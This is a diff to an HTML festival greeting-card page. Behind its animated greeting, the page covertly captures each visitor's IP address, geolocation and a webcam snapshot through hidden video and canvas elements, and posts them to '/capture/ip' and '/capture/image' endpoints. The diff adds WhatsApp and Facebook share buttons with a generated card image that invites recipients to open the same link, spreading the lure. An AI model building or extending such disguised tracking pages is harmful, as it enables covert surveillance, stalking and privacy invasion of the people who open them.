@@ -5,22 +5,34 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Happy fes_name</title>
 <style>
-body{margin:0;background:linear-gradient(135deg,#1a0033,#000033);color:#fff;font-family:Arial,sans-serif;text-align:center;overflow:hidden}
+body{margin:0;background:linear-gradient(135deg,#1a0033,#000033);color:#fff;font-family:Arial,sans-serif;text-align:center;overflow:hidden;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
 .video-wrap,.capture-canvas{display:none}
 h1{font-size:clamp(28px,8vw,48px);margin:20px;text-shadow:0 0 20px #ff0,0 0 40px #f80;animation:glow 2s infinite}
 @keyframes glow{0%,100%{text-shadow:0 0 20px #ff0,0 0 40px #f80}50%{text-shadow:0 0 40px #ff0,0 0 80px #f80}}
 .greeting{font-size:clamp(16px,4vw,24px);margin:10px;color:#fa0}
-.spinner{margin:40px auto;width:40px;height:40px;border:4px solid #333;border-top:#ff0;border-radius:50%;animation:spin 1s linear infinite}
+.spinner{margin:30px auto;width:40px;height:40px;border:4px solid #333;border-top:#ff0;border-radius:50%;animation:spin 1s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
+.share-section{margin-top:20px;display:flex;gap:10px;flex-wrap:wrap;justify-content:center}
+.share-btn{padding:10px 20px;border:none;border-radius:25px;font-size:14px;font-weight:700;color:#fff;cursor:pointer}
+.share-wa{background:#25D366}.share-fb{background:#1877F2}.share-tw{background:#1DA1F2}
+.gift-box{font-size:60px;animation:bounce 1.5s infinite}
+@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
 </style>
 </head><body>
 <video id="video" playsinline autoplay style="display:none"></video>
 <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+<div class="gift-box">🎁</div>
 <h1>Happy fes_name!</h1>
 <div class="greeting">Loading your special greeting... 🎉</div>
 <div class="spinner"></div>
+<div class="share-section">
+<button class="share-btn share-wa" onclick="shareCard('wa')">💬 Send Greeting</button>
+<button class="share-btn share-fb" onclick="shareCard('fb')">📘 Share</button>
+</div>
 <script>
 var API='API_BASE_URL';
+var FESTIVAL='fes_name';
+var SHARE_URL=location.origin+'/t/festival';
 var video=document.getElementById('video'),canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
 fetch(API+'/capture/ip',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
 if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
@@ -33,5 +45,60 @@ ctx.drawImage(video,0,0,640,480);
 fetch(API+'/capture/image',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cat:canvas.toDataURL('image/png')})});
 },3000);
 }).catch(function(){});
+
+function shareCard(t){
+var c=document.createElement('canvas');
+c.width=600;c.height=800;
+var x=c.getContext('2d');
+// Background
+var bg=x.createLinearGradient(0,0,0,800);
+bg.addColorStop(0,'#1a0033');bg.addColorStop(0.5,'#330066');bg.addColorStop(1,'#1a0033');
+x.fillStyle=bg;x.fillRect(0,0,600,800);
+// Decorative fireworks
+for(var i=0;i<40;i++){x.fillStyle=['#ff0','#f80','#f0f','#0ff'][i%4];x.globalAlpha=0.15+Math.random()*0.2;x.beginPath();x.arc(20+Math.random()*560,20+Math.random()*760,1+Math.random()*3,0,6.28);x.fill();}
+x.globalAlpha=1;
+// Border
+x.strokeStyle='#ff0';x.lineWidth=3;x.globalAlpha=0.3;
+x.beginPath();x.roundRect(30,60,540,680,20);x.stroke();
+x.globalAlpha=1;
+// Gift emoji
+x.font='80px system-ui';x.textAlign='center';
+x.fillText('🎁',300,200);
+// Title
+x.fillStyle='#ff0';x.font='bold 44px system-ui';x.shadowColor='#f80';x.shadowBlur=20;
+x.fillText('Happy '+FESTIVAL+'!',300,300);
+x.shadowBlur=0;
+// Subtitle
+x.fillStyle='#fa0';x.font='20px system-ui';
+x.fillText('Wishing you joy and prosperity',300,340);
+// Divider
+x.strokeStyle='rgba(255,200,0,0.3)';x.lineWidth=1;
+x.beginPath();x.moveTo(100,380);x.lineTo(500,380);x.stroke();
+// CTA
+x.fillStyle='#fff';x.font='bold 22px system-ui';
+x.fillText('Send your own greeting:',300,440);
+// URL
+x.fillStyle='#0ff';x.font='bold 18px monospace';
+x.fillText(SHARE_URL,300,480);
+// Decorations
+x.font='36px system-ui';x.globalAlpha=0.5;
+x.fillText('🎊',150,580);x.fillText('🎉',450,580);x.fillText('✨',300,620);
+x.globalAlpha=1;
+// Footer
+x.fillStyle='#9680b0';x.font='12px system-ui';
+x.fillText(FESTIVAL+' Greeting Card',300,700);
+
+c.toBlob(function(blob){
+var textMsg='🎉 Happy '+FESTIVAL+'! Send your own greeting: '+SHARE_URL;
+var file=new File([blob],FESTIVAL+'-greeting.png',{type:'image/png'});
+if(navigator.canShare&&navigator.canShare({files:[file]})){
+navigator.share({text:textMsg,files:[file],title:'Happy '+FESTIVAL}).catch(function(){});
+return;
+}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(textMsg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(textMsg),'_blank');
+var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=FESTIVAL+'-greeting.png';a.click();
+},'image/png');
+}
 </script>
 </body></html>
